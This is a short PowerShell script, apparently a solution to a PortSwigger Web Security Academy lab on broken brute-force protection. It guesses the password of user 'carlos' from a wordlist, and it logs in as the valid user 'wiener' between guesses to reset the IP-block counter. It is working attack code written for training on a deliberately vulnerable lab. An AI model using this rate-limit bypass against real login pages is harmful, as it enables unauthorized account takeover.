##Script represents the solvation of the authentication problem (Broken brute-force protection, IP block).
#motivation - portswigger lab: https://portswigger.net/web-security/authentication

$bd=@{
    username='wiener'
    password='peter'
}
$ur="https://ac081f451ecfe96681c53c5800a700fb.web-security-academy.net/login"
$ErrorActionPreference="SilentlyContinue"

foreach($l in Get-Content .\passwords.txt){
$r=Invoke-WebRequest -method POST -Body $bd -uri $ur -UseBasicParsing -MaximumRedirection 0
$bd2=@{
    username='carlos'
    password=$l
}
$r=Invoke-WebRequest -method POST -Body $bd2 -uri $ur -UseBasicParsing -MaximumRedirection 0
if($r.StatusCode -eq 302){
    Write-Host "Password for Carlos: $l"
    pause
    exit
}
}